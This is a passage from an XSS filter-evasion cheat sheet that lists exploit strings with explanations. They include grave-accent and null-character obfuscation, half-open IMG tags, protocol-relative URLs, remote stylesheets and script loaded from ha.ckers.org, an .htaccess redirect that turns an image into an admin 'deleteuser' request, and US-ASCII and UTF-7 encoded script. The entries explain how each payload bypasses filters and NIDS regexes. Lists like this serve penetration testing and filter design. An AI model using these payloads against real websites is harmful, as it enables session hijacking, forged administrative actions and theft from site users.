Exploit Description: Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.

There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).

This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.

Exploit String: <IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
Exploit Description: Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).

Half-Open HTML/JavaScript
Exploit Name: Half-Open HTML/JavaScript
Exploit String: <IMG SRC="javascript:alert('XSS')"
Exploit Description: Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the ”javascript:” directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close > tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:
     /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/
As a side note, this was also effective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag.

Exploit Description: This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.

Exploit String: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
Exploit Description: IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=”http://badguy.com/a.jpg”> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).

While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”<SCRIPT\s” != ”<SCRIPT/XSS\s”

The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.

Null Chars 1
Exploit Name: Null Chars 1
Exploit String: perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
Exploit Description: Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.

Protocol Resolution Bypass
Exploit Name: Protocol Resolution Bypass
Exploit String: <A HREF="//www.google.com/">XSS</A>
Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).
Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like ”(ht|f)tp(s)?://” (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the ”//” to ”\\”. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.

Protocol resolution in script tags
Exploit Name: Protocol resolution in script tags
Exploit String: <SCRIPT SRC=//ha.ckers.org/.j>
Exploit Description: This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ”.j” is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.

Remote Stylesheet 1
Exploit Name: Remote Stylesheet 1
Exploit String: <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
Exploit Description: Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.

Remote Stylesheet 2
Exploit Name: Remote Stylesheet 2
Exploit String: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
Exploit Description: Remote style sheet part 2 (this works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.

Remote Stylesheet 3
Exploit Name: Remote Stylesheet 3
Exploit String: <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
Exploit Description: Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://ha.ckers.org/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.

Exploit Name: Remote Stylesheet 4
Exploit String: <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
Exploit Description: Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.

US-ASCII encoding
Exploit Name: US-ASCII encoding
Exploit String: %BCscript%BEalert(%A2XSS%A2)%BC/script%BE
Exploit Description: Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.

UTF-7 Encoding
Exploit Name: UTF-7 Encoding
Exploit String: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
Exploit Description: UTF-7 encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google's custom 404 script.
